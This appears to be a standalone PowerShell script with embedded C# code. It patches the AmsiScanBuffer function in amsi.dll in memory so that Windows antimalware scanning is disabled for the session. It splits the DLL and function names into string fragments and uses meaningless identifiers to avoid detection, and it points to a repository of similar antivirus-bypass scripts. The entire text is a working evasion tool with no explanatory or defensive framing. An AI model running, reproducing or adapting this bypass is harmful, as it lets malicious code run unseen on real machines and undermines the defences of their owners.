# find more on: https://github.com/tihanyin/PSSW100AVB
################

$ABCDEFGG = @"
using System;
using System.Runtime.InteropServices;
 
public class waga
{
    static byte[] first = new byte[] { 0xB8, 0x57, 0x00 };
    static byte[] second1 = new byte[] { 0x07, 0x80, 0xC3 };
    static byte[] second2 = new byte[] { 0x07, 0x80, 0xC2, 0x18, 0x00 };
 
    public static void aggggga()
    {
        byte[] x100 = new byte[first.Length + second1.Length];
        byte[] x900 = new byte[first.Length + second2.Length];
        Buffer.BlockCopy(first, 0, x100, 0, first.Length);
        Buffer.BlockCopy(second1, 0, x100, first.Length, second1.Length);
        Buffer.BlockCopy(first, 0, x900, 0, first.Length);
        Buffer.BlockCopy(second2, 0, x900, first.Length, second2.Length);
        if (hihi()) {
            Coucou(x100);
        } else {
            Coucou(x900);
        }
    }
 
    private static void Coucou(byte[] compa)
    {
        try
        {
            var lib = Pluh.LoadLibrary("a" + "msi" + ".dl" + "l");
            var addr = Pluh.GetProcAddress(lib, "Am" + "siSc" + "anBuffe" + "r");
 
            uint kakak;
            Pluh.VirtualProtect(addr, (UIntPtr)compa.Length, 0x40, out kakak);
 
            Marshal.Copy(compa, 0, addr, compa.Length);
        }
        catch (Exception eee)
        {
            Console.WriteLine(" HHH {0}", eee.Message);
        }
    }
 
    private static bool hihi()
        {
            bool hihi = true;
 
            if (IntPtr.Size == 4)
                hihi = false;
 
            return hihi;
        }
}
 
class Pluh
{
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
 
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
 
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
 
Add-Type -TypeDefinition $ABCDEFGG -Language CSharp
[waga]::aggggga()
